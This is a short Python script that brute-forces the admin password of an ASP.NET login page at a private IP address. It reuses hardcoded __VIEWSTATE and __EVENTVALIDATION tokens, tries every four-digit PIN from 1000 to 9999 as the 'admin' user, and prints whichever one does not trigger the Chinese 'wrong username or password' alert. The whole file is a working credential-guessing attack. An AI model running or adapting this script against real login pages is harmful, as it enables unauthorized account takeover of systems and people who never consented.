import requests
import re
url='http://10.59.14.47:8012/Login.aspx'
# webdata=requests.get(url)
# VIEWSTATE=re.findall('id="__VIEWSTATE" value="(.*)" />',webdata.text)
# EVENTVALIDATION=re.findall('id="__EVENTVALIDATION" value="(.*)" />',webdata.text)
# v=VIEWSTATE[0]
# e=EVENTVALIDATION[0]
# print(v,e)
# /wEPDwULLTEzMzIyMzMxODNkZGeLNfPwTRUS6BLI/8IEuIPFefQtlC+RK7lmWlZR00e4 /wEWAwKyyJ2/DgL2hcKHBQKC3IeGDMTNbMt3aj+s3Ytd7gEc1FL6MAVniM6rP/VbFifV3Lud

for i in range(1000,10000):
    password="%04d"%i
    postdata={
        "__VIEWSTATE":"/wEPDwULLTEzMzIyMzMxODNkZGeLNfPwTRUS6BLI/8IEuIPFefQtlC+RK7lmWlZR00e4",
        "__EVENTVALIDATION":"/wEWAwKyyJ2/DgL2hcKHBQKC3IeGDMTNbMt3aj+s3Ytd7gEc1FL6MAVniM6rP/VbFifV3Lud",
        "loginRole":"admin",
        "username":"admin",
        "btnLogin":"",
        "password":password,
        "sex":"tea",
    }
    data=requests.post(url,postdata)
    # print(data.text)
    msg=re.findall('window.alert\("(.*)"\)',data.text)
    if msg[0]=='用户名或密码错误,请重新输入!':
        print('--')
    else:
        print(password)
        break


